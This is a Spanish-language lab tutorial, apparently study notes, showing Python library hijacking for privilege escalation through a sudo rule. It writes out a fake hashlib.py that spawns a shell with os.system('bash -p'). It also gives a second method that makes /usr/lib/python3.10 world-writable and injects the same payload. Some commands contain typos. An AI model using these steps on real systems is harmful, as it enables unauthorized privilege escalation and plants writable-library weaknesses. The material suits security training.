> Con esta vulnerabilidad podemos aprovecharnos del path de python y crear un archivo mas adelante en el path para que ejecute ese y no el de la libreria.

## Paso a paso

### Preparando el entorno
```
apt install python3
```
- Cambiamos privilegios
```
nano /etc/sudoers

-------------------------------------
savitar ALL=(manolito) NOPASSWD: /usr/bin/python /tmp/example.py
-------------------------------------

sudo -l
```

- Accion como manolito
```python
su manolito
cd /tmp
nano example.py

-------------------------------------
import hashlib
if __name__=='__main__':
	cadena="hola esta es mi cadena"	
	print(hashlib.md5( cadena.encode().hexdigest() ))
-------------------------------------

python3 example.py
```
- cadena en md5 del texto

### Pruebas
```bash
su savitar
cd /tmp/
sudo -u manolito python3 /tmp/example.py
```

### Manipulacion del path de python
- Para ver el path
```
python3 --c 'import sys; print(sys.path)'
```

- Encontrar la ruta de la libreria que utiliza `example.py`
```
apt install locate
updatedb
locate hashlib.py
```
- En el directorio `/tmp`
```python
nano hashlib.py

-------------------------------------
import os
os.system("bash -p")
-------------------------------------
```
- Ejecutamos
```
sudo -u manolito python3 /tmp/example.py
```
- Vemos quienes somos, pista `manolito`
```
whoami
```

### Otra forma
- Podemos tambien ver permisos en otras rutas si hay para escribir, podemos aniadir codigo malicioso desde ahi
- Preparacion
```
chmod o+w /usr/lib/ptyhon3.10 -R
ls -l usr/lib/python3.10/hashlib.py
```

```python
nano usr/lib/python3.10/hashlib.py

-------------------------------------
import os 
os.system("bash -p")
-------------------------------------
```
- Ejecutamos
```
sudo -u manolito python3 /tmp/example.py
```
- Vemos quienes somos, pista `manolito`
```
whoami
```
